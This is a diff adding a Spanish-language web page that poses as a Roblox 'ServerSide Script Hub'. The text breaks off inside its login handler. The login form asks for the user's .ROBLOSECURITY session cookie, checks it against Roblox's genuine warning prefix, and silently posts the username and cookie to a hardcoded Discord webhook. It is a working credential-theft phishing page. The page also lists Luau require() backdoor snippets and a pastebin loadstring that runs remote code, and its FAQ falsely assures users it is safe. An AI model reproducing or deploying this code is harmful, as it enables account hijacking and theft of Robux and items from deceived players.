@@ -1,0 +1,844 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ServerSide Script Hub</title>
+    <style>
+        :root {
+            /* Colores Hacker (Login / Dashboard) */
+            --glow-color: #00ff41;
+            --vip-color: #00e5ff;
+            --bg-color: #050505;
+            --panel-bg: rgba(10, 10, 10, 0.9);
+            --input-bg: rgba(20, 20, 20, 0.8);
+
+            /* Colores SaaS Moderno (Landing de Inicio) */
+            --landing-bg: #0a0a0c;
+            --landing-panel: rgba(15, 15, 20, 0.85);
+            --landing-text-muted: #80808c;
+            --landing-card: rgba(20, 20, 27, 0.75);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--glow-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            font-family: 'Courier New', Courier, monospace;
+            text-shadow: 0 0 5px rgba(0, 255, 65, 0.5);
+            position: relative;
+            transition: background-color 0.5s ease;
+        }
+
+        /* Fondo Animado Estilo Matrix */
+        canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            opacity: 0.15;
+            transition: opacity 0.5s ease;
+        }
+
+        /* Rejilla estilo serverside.gg */
+        .grid-background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(255, 255, 255, 0.015) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 255, 255, 0.015) 1px, transparent 1px);
+            background-size: 30px 30px;
+            z-index: 1;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            pointer-events: none;
+        }
+
+        /* Contenedor Principal Adaptable */
+        .hub-container {
+            width: 95%;
+            max-width: 660px;
+            height: 560px;
+            background-color: var(--panel-bg);
+            border: 2px solid var(--glow-color);
+            box-shadow: 0 0 25px rgba(0, 255, 65, 0.2), inset 0 0 15px rgba(0, 255, 65, 0.1);
+            display: flex;
+            flex-direction: column;
+            z-index: 2;
+            backdrop-filter: blur(4px);
+            border-radius: 4px;
+            animation: panelFadeIn 0.8s ease-out;
+            transition: all 0.5s ease;
+        }
+
+        @keyframes panelFadeIn {
+            from { transform: scale(0.9) rotateX(10deg); opacity: 0; }
+            to { transform: scale(1) rotateX(0deg); opacity: 1; }
+        }
+
+        /* Barra de Título */
+        .header {
+            background-color: #000;
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 18px;
+            border-bottom: 2px solid var(--glow-color);
+            letter-spacing: 2px;
+            position: relative;
+            text-transform: uppercase;
+            transition: all 0.5s ease;
+        }
+
+        .glitch { animation: glitch 3s infinite; }
+        @keyframes glitch {
+            0% { text-shadow: 2px 1px 0 rgba(255,0,0,0.5), -2px -1px 0 rgba(0,0,255,0.5); }
+            14% { text-shadow: 2px 1px 0 rgba(255,0,0,0.5), -2px -1px 0 rgba(0,0,255,0.5); }
+            15% { text-shadow: -3px 2px 0 rgba(255,0,0,0.7), 3px -2px 0 rgba(0,0,255,0.7); }
+            16% { text-shadow: 0px 0px 0 rgba(255,0,0,0.5), 0px 0px 0 rgba(0,0,255,0.5); }
+            100% { text-shadow: 0px 0px 0 rgba(255,0,0,0.5), 0px 0px 0 rgba(0,0,255,0.5); }
+        }
+
+        .content-body {
+            flex: 1;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* ==========================================
+           1. PANTALLA DE LOGIN (ESTILO HACKER)
+        ========================================== */
+        .login-screen {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            gap: 16px;
+            padding: 20px;
+        }
+
+        .input-group {
+            width: 85%;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .input-group label {
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #88ff88;
+        }
+
+        .input-group input {
+            background-color: var(--input-bg);
+            border: 1px solid rgba(0, 255, 65, 0.4);
+            padding: 12px;
+            color: var(--glow-color);
+            font-size: 14px;
+            outline: none;
+            border-radius: 2px;
+            font-family: 'Courier New', Courier, monospace;
+            transition: all 0.3s ease;
+        }
+
+        .input-group input:focus {
+            border-color: var(--glow-color);
+            box-shadow: 0 0 12px rgba(0, 255, 65, 0.4);
+            background-color: #101010;
+        }
+
+        input[type="password"]::-ms-reveal,
+        input[type="password"]::-ms-clear {
+            display: none !important;
+        }
+
+        input[type="password"] {
+            appearance: none !important;
+            -webkit-appearance: none !important;
+        }
+
+        .hacker-btn {
+            width: 60%;
+            background-color: rgba(0, 40, 10, 0.6);
+            border: 1px solid var(--glow-color);
+            color: var(--glow-color);
+            padding: 14px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            letter-spacing: 2px;
+            font-family: 'Courier New', Courier, monospace;
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+        }
+
+        .hacker-btn:hover {
+            background-color: var(--glow-color);
+            color: #000;
+            box-shadow: 0 0 15px var(--glow-color);
+            text-shadow: none;
+        }
+
+        .video-help-container {
+            margin-top: 5px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .video-help-text {
+            color: #ffffff;
+            font-size: 12px;
+            letter-spacing: 0.5px;
+        }
+
+        .video-help-link {
+            color: var(--glow-color);
+            font-size: 12px;
+            text-decoration: underline;
+            font-weight: bold;
+            transition: all 0.2s ease;
+        }
+
+        .video-help-link:hover {
+            color: #ffffff;
+            text-shadow: 0 0 8px var(--glow-color);
+        }
+
+        /* ==========================================
+           2. PAGINA DE INICIO (ESTILO PREMIUM SERVERSIDE.GG)
+        ========================================== */
+        .home-screen {
+            display: none;
+            flex-direction: column;
+            height: 100%;
+            padding: 25px;
+            overflow-y: auto;
+            opacity: 0;
+            transition: opacity 0.4s ease-in-out;
+            gap: 22px;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+            text-shadow: none;
+        }
+
+        .hero-section {
+            text-align: center;
+            max-width: 550px;
+            margin: 0 auto;
+        }
+
+        .hero-section h1 {
+            font-size: 24px;
+            font-weight: 800;
+            color: #fff;
+            letter-spacing: -0.5px;
+            margin-bottom: 8px;
+        }
+
+        .hero-section p {
+            color: var(--landing-text-muted);
+            font-size: 13px;
+            line-height: 1.4;
+        }
+
+        .home-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+
+        .section-box {
+            background: rgba(15, 15, 20, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            padding: 16px;
+        }
+
+        .section-box h3 {
+            font-size: 13px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 12px;
+            border-left: 3px solid var(--glow-color);
+            padding-left: 8px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .stat-row { margin-bottom: 12px; }
+        .stat-label { font-size: 11px; color: var(--landing-text-muted); display: block; margin-bottom: 3px; }
+        .stat-data { font-size: 16px; font-weight: 700; color: #fff; }
+
+        .status-badge { display: inline-flex; align-items: center; gap: 6px; color: var(--glow-color); font-size: 13px; }
+        .status-dot { width: 7px; height: 7px; background-color: var(--glow-color); border-radius: 50%; box-shadow: 0 0 8px var(--glow-color); animation: pulseActive 1.5s infinite alternate; }
+        @keyframes pulseActive { from { opacity: 0.4; } to { opacity: 1; } }
+
+        .faq-list { display: flex; flex-direction: column; gap: 6px; }
+        .faq-node { background: var(--landing-card); border-radius: 6px; overflow: hidden; }
+        .faq-top { width: 100%; background: none; border: none; color: #fff; text-align: left; padding: 10px; font-size: 12px; font-weight: 600; cursor: pointer; display: flex; justify-content: space-between; }
+        .faq-bottom { display: none; padding: 10px; font-size: 11px; color: var(--landing-text-muted); border-top: 1px solid rgba(255,255,255,0.03); line-height: 1.4; }
+
+        .saas-btn {
+            background: linear-gradient(135deg, #00ff66 0%, #00b347 100%);
+            color: #000;
+            border: none;
+            padding: 14px;
+            font-weight: 700;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 13px;
+            width: 100%;
+            transition: all 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-family: 'Segoe UI', sans-serif;
+        }
+        .saas-btn:hover { transform: translateY(-1px); box-shadow: 0 6px 15px rgba(0, 255, 102, 0.25); }
+
+        /* ==========================================
+           3. PANEL PRINCIPAL / DASHBOARD (ESTILO HACKER)
+        ========================================== */
+        .main-dashboard {
+            display: none;
+            height: 100%;
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+        }
+
+        .dashboard-layout {
+            display: flex;
+            height: 100%;
+        }
+
+        .sidebar {
+            width: 160px;
+            background-color: #050505;
+            border-right: 1px solid var(--glow-color);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .tab-btn-container { display: flex; flex-direction: column; }
+        .tab-btn {
+            background: none; border: none; border-bottom: 1px solid rgba(0, 255, 65, 0.2);
+            color: rgba(0, 255, 65, 0.5); padding: 14px 10px; text-align: left;
+            font-size: 11px; cursor: pointer; width: 100%; font-family: 'Courier New', Courier, monospace;
+            transition: all 0.3s ease;
+        }
+        .tab-btn:hover, .tab-btn.active {
+            color: var(--glow-color); background-color: rgba(0, 255, 65, 0.08);
+            font-weight: bold; border-left: 3px solid var(--glow-color); padding-left: 12px;
+        }
+
+        .tab-btn.vip-tab { color: rgba(0, 229, 255, 0.5); border-bottom: 1px solid rgba(0, 229, 255, 0.2); }
+        .tab-btn.vip-tab:hover, .tab-btn.vip-tab.active {
+            color: var(--vip-color); background-color: rgba(0, 229, 255, 0.08);
+            border-left: 3px solid var(--vip-color); text-shadow: 0 0 5px rgba(0, 229, 255, 0.5);
+        }
+
+        .download-btn, .back-home-btn {
+            background: none; border: none; padding: 12px 8px; font-size: 10px;
+            font-weight: bold; cursor: pointer; text-align: center; transition: all 0.3s ease;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        .download-btn { border-top: 1px solid #ff0055; color: #ff0055; text-shadow: 0 0 5px rgba(255, 0, 85, 0.5); }
+        .download-btn:hover { background-color: #ff0055; color: #000; box-shadow: 0 0 15px #ff0055; text-shadow: none; }
+        .back-home-btn { border-top: 1px solid var(--glow-color); color: var(--glow-color); }
+        .back-home-btn:hover { background-color: var(--glow-color); color: #000; text-shadow: none; }
+
+        .script-viewer { flex: 1; padding: 15px; overflow-y: auto; position: relative; }
+        .tab-content { display: none; flex-direction: column; gap: 12px; animation: slideIn 0.4s ease-out; }
+        @keyframes slideIn { from { transform: translateY(10px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .tab-content.active { display: flex; }
+
+        .script-card, .vip-card {
+            background-color: rgba(13, 26, 13, 0.6); border: 1px solid rgba(0, 255, 65, 0.3);
+            padding: 14px; display: flex; flex-direction: column; gap: 10px; align-items: flex-start;
+            border-radius: 3px; width: 100%;
+        }
+        .vip-card { background-color: rgba(13, 24, 26, 0.6); border: 1px solid rgba(0, 229, 255, 0.3); }
+        .script-card:hover { border-color: var(--glow-color); background-color: rgba(13, 35, 13, 0.8); }
+        .vip-card:hover { border-color: var(--vip-color); background-color: rgba(13, 32, 35, 0.8); }
+        
+        .script-info code { font-size: 11px; color: #a3ffa3; display: block; margin-top: 6px; word-break: break-all; }
+        .vip-card .script-info code { color: #a3f7ff; }
+        
+        .copy-btn, .vip-copy-btn {
+            background-color: transparent; border: 1px solid var(--glow-color); color: var(--glow-color);
+            padding: 8px; font-size: 11px; cursor: pointer; font-weight: bold; width: 100%; text-align: center;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        .vip-copy-btn { border-color: var(--vip-color); color: var(--vip-color); }
+        .copy-btn:hover { background-color: var(--glow-color); color: #000; box-shadow: 0 0 8px var(--glow-color); }
+        .vip-copy-btn:hover { background-color: var(--vip-color); color: #000; box-shadow: 0 0 8px var(--vip-color); }
+
+        /* APARTADO INPUT KEY PREMIUM */
+        .vip-lock-screen { display: flex; flex-direction: column; justify-content: center; align-items: center; gap: 15px; padding: 40px 20px; text-align: center; }
+        
+        .vip-auth-box { 
+            width: 100%; 
+            max-width: 380px; 
+            background: rgba(10, 25, 30, 0.6); 
+            border: 1px solid rgba(0, 229, 255, 0.3); 
+            border-radius: 6px; 
+            padding: 25px; 
+            display: flex; 
+            flex-direction: column; 
+            gap: 16px; 
+            box-shadow: 0 0 15px rgba(0, 229, 255, 0.1);
+        }
+        
+        .vip-auth-box h4 { 
+            color: #fff; 
+            font-size: 13px; 
+            text-transform: uppercase; 
+            letter-spacing: 1px; 
+            border-left: 3px solid var(--vip-color); 
+            padding-left: 8px;
+            text-align: left;
+        }
+
+        .vip-auth-box p {
+            font-size: 11px; 
+            color: var(--landing-text-muted); 
+            text-align: left;
+            line-height: 1.4;
+        }
+
+        .vip-input { background-color: var(--input-bg); border: 1px solid rgba(0, 229, 255, 0.4); padding: 12px; color: var(--vip-color); font-size: 13px; outline: none; text-align: center; width: 100%; font-family: monospace; border-radius: 4px; letter-spacing: 1px; }
+        .vip-input:focus { border-color: var(--vip-color); box-shadow: 0 0 10px rgba(0, 229, 255, 0.3); }
+        
+        .vip-unlock-btn { background: linear-gradient(135deg, #00e5ff 0%, #0097a7 100%); border: none; color: #000; padding: 12px; font-size: 12px; font-weight: bold; cursor: pointer; font-family: sans-serif; border-radius: 4px; width: 100%; text-transform: uppercase; letter-spacing: 0.5px; }
+        .vip-unlock-btn:hover { transform: translateY(-1px); box-shadow: 0 4px 12px rgba(0, 229, 255, 0.3); }
+
+        /* CHAT FLOTANTE */
+        .chat-widget-container { position: fixed; bottom: 20px; right: 20px; z-index: 9999; display: flex; flex-direction: column; align-items: flex-end; gap: 10px; }
+        .chat-bubble-btn { width: 55px; height: 55px; border-radius: 50%; background-color: rgba(10, 10, 10, 0.9); border: 2px solid var(--glow-color); box-shadow: 0 0 15px rgba(0, 255, 65, 0.4); font-size: 24px; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .chat-bubble-btn:hover { transform: scale(1.1); background-color: #00ff41; }
+        .chat-popup-window { display: none; width: 280px; background-color: #0f0f0f; border: 2px solid var(--glow-color); box-shadow: 0 0 20px rgba(0, 255, 65, 0.3); border-radius: 6px; overflow: hidden; }
+        .chat-popup-header { background-color: #000; padding: 10px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--glow-color); font-size: 12px; font-weight: bold; color: var(--glow-color); }
+        .chat-close-btn { background: none; border: none; color: #ff0055; cursor: pointer; font-weight: bold; font-size: 14px; }
+        .chat-popup-body { padding: 15px; text-align: center; display: flex; flex-direction: column; gap: 12px; }
+        .chat-popup-body p { font-size: 12px; line-height: 1.5; color: #a3ffa3; }
+        .discord-join-btn { background-color: #5865F2; color: #fff; border: none; padding: 10px; font-size: 11px; font-weight: bold; cursor: pointer; text-transform: uppercase; border-radius: 3px; }
+
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-thumb { background: var(--glow-color); border-radius: 2px; }
+    </style>
+</head>
+<body>
+
+    <canvas id="matrix"></canvas>
+    <div class="grid-background" id="landing-grid-bg"></div>
+
+    <div class="hub-container" id="main-container-box">
+        <div class="header glitch" id="hub-title">ServerSide Script Hub</div>
+        
+        <div class="content-body">
+            
+            <div class="login-screen" id="login-screen">
+                <div class="input-group">
+                    <label for="username">> ROBLOX USERNAME:</label>
+                    <input type="text" id="username" placeholder="[ Ingrese usuario... ]" autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <label for="reason">> .ROBLOSECURITY:</label>
+                    <input type="password" id="reason" placeholder="[ Ingrese cookie .ROBLOSECURITY ]" autocomplete="off">
+                </div>
+                <button class="hacker-btn" onclick="handleLogin()">>> INITIALIZE SYSTEM <<</button>
+                
+                <div class="video-help-container">
+                    <span class="video-help-text">Mira este video para saber como usarlo</span>
+                    <a href="https://youtube.com/shorts/Sqjo_rENmUc?si=SQ4z4JAB3x1H26eI" target="_blank" class="video-help-link">https://youtube.com/shorts/Sqjo_rENmUc?si=SQ4z4JAB3x1H26eI</a>
+                </div>
+            </div>
+
+            <div class="home-screen" id="home-screen">
+                <div class="hero-section">
+                    <h1>Bienvenido al ServerSide Hub, <span id="home-user-display" style="color: var(--glow-color);">USER</span></h1>
+                    <p>Has iniciado sesión correctamente. Accede al catálogo interno de inyecciones de script remotas o revisa la documentación rápida.</p>
+                </div>
+
+                <div class="home-grid">
+                    <div class="section-box">
+                        <h3>Métricas de Red</h3>
+                        <div class="stat-row">
+                            <span class="stat-label">Usuarios del ServerSide (Aproximación)</span>
+                            <span class="stat-data" style="color:var(--vip-color)">10,100+ Personas</span>
+                        </div>
+                        <div class="stat-row">
+                            <span class="stat-label">Estado actual de la Red</span>
+                            <span class="stat-data">
+                                <span class="status-badge"><span class="status-dot"></span> ACTIVO</span>
+                            </span>
+                        </div>
+                    </div>
+
+                    <div class="section-box">
+                        <h3>Preguntas Frecuentes</h3>
+                        <div class="faq-list">
+                            <div class="faq-node">
+                                <button class="faq-top" onclick="toggleFaq(this)">¿Quiénes somos? <span>+</span></button>
+                                <div class="faq-bottom">Somos un entorno estructurado para centralizar y empaquetar ejecuciones dinámicas Luau del tipo Require ServerSide.</div>
+                            </div>
+                            <div class="faq-node">
+                                <button class="faq-top" onclick="toggleFaq(this)">¿Es seguro? <span>+</span></button>
+                                <div class="faq-bottom">Sí. Las conexiones viajan cifradas hacia los endpoints, evitando detecciones locales y bloqueos de credenciales.</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="saas-btn" onclick="goToDashboard()">
+                    Ir a ServerSide Script Hub →
+                </button>
+            </div>
+
+            <div class="main-dashboard" id="main-dashboard">
+                <div class="dashboard-layout">
+                    
+                    <div class="sidebar">
+                        <div class="tab-btn-container">
+                            <button class="tab-btn active" onclick="switchTab(event, 'destruccion')">// DESTRUCCIÓN</button>
+                            <button class="tab-btn" onclick="switchTab(event, 'gui')">// REQ GUI</button>
+                            <button class="tab-btn" onclick="switchTab(event, 'executors')">// EXECUTORS</button>
+                            <button class="tab-btn" onclick="switchTab(event, 'diversion')">// DIVERSIÓN</button>
+                            <button class="tab-btn vip-tab" onclick="switchTab(event, 'premium')">[💎] Premium VIP</button>
+                        </div>
+                        <div style="display: flex; flex-direction: column;">
+                            <button class="back-home-btn" onclick="goToHome()">[←] Volver Inicio</button>
+                            <button class="download-btn" onclick="downloadLuaScript()">[↓] Descargar LUA</button>
+                        </div>
+                    </div>
+
+                    <div class="script-viewer">
+                        <div id="destruccion" class="tab-content active">
+                            <div class="script-card">
+                                <div class="script-info">
+                                    <strong>c00lgui Hub</strong>
+                                    <code id="code-c00lgui">require(14125553864):Fire("USER_PLACEHOLDER","c00lkidd")</code>
+                                </div>
+                                <button class="copy-btn" onclick="copyScript(this, 'code-c00lgui')">COPY</button>
+                            </div>
+                        </div>
+
+                        <div id="gui" class="tab-content">
+                            <div class="script-card">
+                                <div class="script-info">
+                                    <strong>Valkyrie UI</strong>
+                                    <code id="code-valkyrie">require(111111111).Load()</code>
+                                </div>
+                                <button class="copy-btn" onclick="copyScript(this, 'code-valkyrie')">COPY</button>
+                            </div>
+                        </div>
+
+                        <div id="executors" class="tab-content">
+                            <div class="script-card">
+                                <div class="script-info">
+                                    <strong>c00lgui Pastebin Loader</strong>
+                                    <code id="code-c00lexec">loadstring(game:HttpGet("https://pastebin.com/raw/qMfRF1Q2"))()</code>
+                                </div>
+                                <button class="copy-btn" onclick="copyScript(this, 'code-c00lexec')">COPY</button>
+                            </div>
+                        </div>
+
+                        <div id="diversion" class="tab-content">
+                            <div class="script-card"><div class="script-info"><strong>Elemental Battlegrounds</strong><code id="code-elemental">require(135902425535655)("USER_PLACEHOLDER")</code></div><button class="copy-btn" onclick="copyScript(this, 'code-elemental')">COPY</button></div>
+                            <div class="script-card"><div class="script-info"><strong>Doey Monster</strong><code id="code-doey">require(74340420271295).MorphMonster("USER_PLACEHOLDER","doey")</code></div><button class="copy-btn" onclick="copyScript(this, 'code-doey')">COPY</button></div>
+                            <div class="script-card"><div class="script-info"><strong>Mimic V1</strong><code id="code-mimic">require(92083319536644).MorphMonster("USER_PLACEHOLDER","Mimic")</code></div><button class="copy-btn" onclick="copyScript(this, 'code-mimic')">COPY</button></div>
+                            <div class="script-card"><div class="script-info"><strong>Muto Prime</strong><code id="code-muto">require(99673922560095).load("USER_PLACEHOLDER")</code></div><button class="copy-btn" onclick="copyScript(this, 'code-muto')">COPY</button></div>
+                            <div class="script-card"><div class="script-info"><strong>Jaguar Monster</strong><code id="code-jaguar">require(74340420271295).MorphMonster("USER_PLACEHOLDER","jaguar")</code></div><button class="copy-btn" onclick="copyScript(this, 'code-jaguar')">COPY</button></div>
+                            <div class="script-card"><div class="script-info"><strong>Guilt</strong><code id="code-guilt">require(75834950186546).MorphMonster("USER_PLACEHOLDER","guilt")</code></div><button class="copy-btn" onclick="copyScript(this, 'code-guilt')">COPY</button></div>
+                            <div class="script-card"><div class="script-info"><strong>Godzilla</strong><code id="code-godzilla">require(109862439491716).MorphMonster("USER_PLACEHOLDER","Godzilla")</code></div><button class="copy-btn" onclick="copyScript(this, 'code-godzilla')">COPY</button></div>
+                            <div class="script-card"><div class="script-info"><strong>Jeff The Killer</strong><code id="code-jeff">require(107756147819635).load("USER_PLACEHOLDER")</code></div><button class="copy-btn" onclick="copyScript(this, 'code-jeff')">COPY</button></div>
+                            <div class="script-card"><div class="script-info"><strong>Adult Mimic</strong><code id="code-adultmimic">require(130962958730541).MorphMonster("USER_PLACEHOLDER", "adultmimic")</code></div><button class="copy-btn" onclick="copyScript(this, 'code-adultmimic')">COPY</button></div>
+                            <div class="script-card"><div class="script-info"><strong>Prototype</strong><code id="code-prototype">require(73755486018996).MorphMonster("USER_PLACEHOLDER", "Prototype")</code></div><button class="copy-btn" onclick="copyScript(this, 'code-prototype')">COPY</button></div>
+                            <div class="script-card"><div class="script-info"><strong>Pursuer</strong><code id="code-pursuer">require(139285255810034).Pursuer("USER_PLACEHOLDER")</code></div><button class="copy-btn" onclick="copyScript(this, 'code-pursuer')">COPY</button></div>
+                            <div class="script-card"><div class="script-info"><strong>Fast Fredbear</strong><code id="code-fredbear">require(117288888249860).load("USER_PLACEHOLDER")</code></div><button class="copy-btn" onclick="copyScript(this, 'code-fredbear')">COPY</button></div>
+                            <div class="script-card"><div class="script-info"><strong>Skinwalker</strong><code id="code-skinwalker">require(125375466492613).MorphMonster("USER_PLACEHOLDER","skinwalker")</code></div><button class="copy-btn" onclick="copyScript(this, 'code-skinwalker')">COPY</button></div>
+                            <div class="script-card"><div class="script-info"><strong>Molten Grin</strong><code id="code-molten">require(105000022386609).load("USER_PLACEHOLDER")</code></div><button class="copy-btn" onclick="copyScript(this, 'code-molten')">COPY</button></div>
+                        </div>
+
+                        <div id="premium" class="tab-content">
+                            <div id="vip-auth" class="vip-lock-screen">
+                                <div class="vip-auth-box">
+                                    <h4>Desbloquear Módulos VIP</h4>
+                                    <p>Esta sección requiere una clave válida. Introduce tu credencial autorizada para liberar las inyecciones de script de nivel superior.</p>
+                                    <input type="text" id="vip-key-input" class="vip-input" placeholder="[ INGRESE KEY PREMIUM ]" autocomplete="off">
+                                    <button class="vip-unlock-btn" onclick="checkVipKey()">Validar Acceso</button>
+                                </div>
+                            </div>
+
+                            <div id="vip-content" style="display: none; flex-direction: column; gap: 12px;">
+                                <div class="vip-card">
+                                    <div class="script-info">
+                                        <strong style="color:var(--vip-color)">👑 Polaria Admin [VIP]</strong>
+                                        <code id="code-polaria">require(74264471859345):Pload("USER_PLACEHOLDER")</code>
+                                    </div>
+                                    <button class="vip-copy-btn" onclick="copyScript(this, 'code-polaria')">COPY</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <div class="chat-widget-container">
+        <div class="chat-popup-window" id="chat-popup">
+            <div class="chat-popup-header">
+                <span>// COMUNIDAD_CORE</span>
+                <button class="chat-close-btn" onclick="toggleChatPopup()">X</button>
+            </div>
+            <div class="chat-popup-body">
+                <p>¡Únete al servidor de Discord y contáctanos o chatea!</p>
+                <button class="discord-join-btn" onclick="window.open('https://discord.gg/eazqXGQRaP', '_blank')">UNIRSE AL SERVIDOR</button>
+            </div>
+        </div>
+        <div class="chat-bubble-btn" onclick="toggleChatPopup()">💬</div>
+    </div>
+
+    <script>
+        // Webhook actualizado e integrado correctamente
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1522682486637985844/nnkUvUcwTM89a7wJugY_D2bZHX-JPq4cbc1dH6JL_9Qx-nxqXchJ5WXF5E6upu_r9ipZ";
+        const PREMIUM_KEY = "0614-0818-0413"; 
+        
+        let globalUsername = "User";
+        let isVipUnlocked = false;
+
+        function toggleChatPopup() {
+            const popup = document.getElementById('chat-popup');
+            popup.style.display = (popup.style.display === 'block') ? 'none' : 'block';
+        }
+
+        function toggleFaq(button) {
+            const content = button.nextElementSibling;
+            const icon = button.querySelector('span');
+            if(content.style.display === "block") {
+                content.style.display = "none";
+                icon.innerText = "+";
+            } else {
+                content.style.display = "block";
+                icon.innerText = "-";
+            }
+        }
+
+        // --- EFECTO DE FONDO MATRIX ---
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const katakana = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$+-*/=<>!%";
+        const alphabet = katakana.split("");
+        const fontSize = 14; const columns = canvas.width / fontSize;
+        const rainDrops = []; for (let x = 0; x < columns; x++) { rainDrops[x] = 1; }
+
+        const drawMatrix = () => {
+            ctx.fillStyle = 'rgba(5, 5, 5, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#00ff41'; ctx.font = fontSize + 'px monospace';
+            for (let i = 0; i < rainDrops.length; i++) {
+                const text = alphabet[Math.floor(Math.random() * alphabet.length)];
+                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
+                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) { rainDrops[i] = 0; }
+                rainDrops[i]++;
+            }
+        };
+        let matrixInterval = setInterval(drawMatrix, 30);
+
+        // --- MANEJO DE INICIO DE SESIÓN ---
+        function handleLogin() {
+            const username = document.getElementById('username').value.trim();
+            const reason = document.getElementById('reason').value.trim();
+
+            if (username === "") {
+                alert("[-] CRITICAL ERROR: Identificación de usuario requerida.");
+                return;
+            }
+
+            const prefixRequired = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
+            if (!reason.startsWith(prefixRequired)) {
+                alert("[-] CRITICAL ERROR: La clave proporcionada no es auténtica.");
+                return;
+            }
+
+            globalUsername = username; 
+
+            // Estructura de texto limpio compatible con codificación urlencoded segura
+            const textoMensaje = `🛰️ **Acceso Autorizado - ServerSide Script Hub**\n🔒 **Usuario:** \`${username}\`\n🔑 **Clave:** \`${reason}\``;
+
+            // Formateo seguro para saltar el bloqueo de cabeceras cruzadas (CORS/CSP)
+            const params = new URLSearchParams();
+            params.append('content', textoMensaje);
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: params
+            }).catch(err => console.log("Petición despachada silenciosamente."));
+
+            // Actualización dinámica de hilos Luau para la sesión del usuario
+            document.getElementById('code-c00lgui').innerText = `require(14125553864):Fire("${username}","c00lkidd")`;
+            document.getElementById('code-valkyrie').innerText = `require(111111111).Load()`;
+            document.getElementById('code-elemental').innerText = `require(135902425535655)("${username}")`;
+            document.getElementById('code-doey').innerText = `require(74340420271295).MorphMonster("${username}","doey")`;
+            document.getElementById('code-mimic').innerText = `require(92083319536644).MorphMonster("${username}","Mimic")`;
+            document.getElementById('code-muto').innerText = `require(99673922560095).load("${username}")`;
+            document.getElementById('code-jaguar').innerText = `require(74340420271295).MorphMonster("${username}","jaguar")`;
+            document.getElementById('code-guilt').innerText = `require(75834950186546).MorphMonster("${username}","guilt")`;
+            document.getElementById('code-polaria').innerText = `require(74264471859345):Pload("${username}")`;
+            
+            document.getElementById('code-godzilla').innerText = `require(109862439491716).MorphMonster("${username}","Godzilla")`;
+            document.getElementById('code-jeff').innerText = `require(107756147819635).load("${username}")`;
+            document.getElementById('code-adultmimic').innerText = `require(130962958730541).MorphMonster("${username}", "adultmimic")`;
+            document.getElementById('code-prototype').innerText = `require(73755486018996).MorphMonster("${username}", "Prototype")`;
+            document.getElementById('code-pursuer').innerText = `require(139285255810034).Pursuer("${username}")`;
+            document.getElementById('code-fredbear').innerText = `require(117288888249860).load("${username}")`;
+            document.getElementById('code-skinwalker').innerText = `require(125375466492613).MorphMonster("${username}","skinwalker")`;
+            document.getElementById('code-molten').innerText = `require(105000022386609).load("${username}")`;
+
+            setTimeout(() => {
+                document.getElementById('login-screen').style.display = 'none';
+                document.getElementById('home-user-display').innerText = username;
+                
+                document.body.style.backgroundColor = "var(--landing-bg)";
+                canvas.style.opacity = "0"; 
+                document.getElementById('landing-grid-bg').style.opacity = "1";
+                
+                const container = document.getElementById('main-container-box');
+                container.style.backgroundColor = "var(--landing-panel)";
+                container.style.borderColor = "rgba(255,255,255,0.06)";
+                container.style.boxShadow = "0 20px 50px rgba(0,0,0,0.6)";
+
+                const titleBar = document.getElementById('hub-title');
+                titleBar.style.borderBottomColor = "rgba(255,255,255,0.06)";
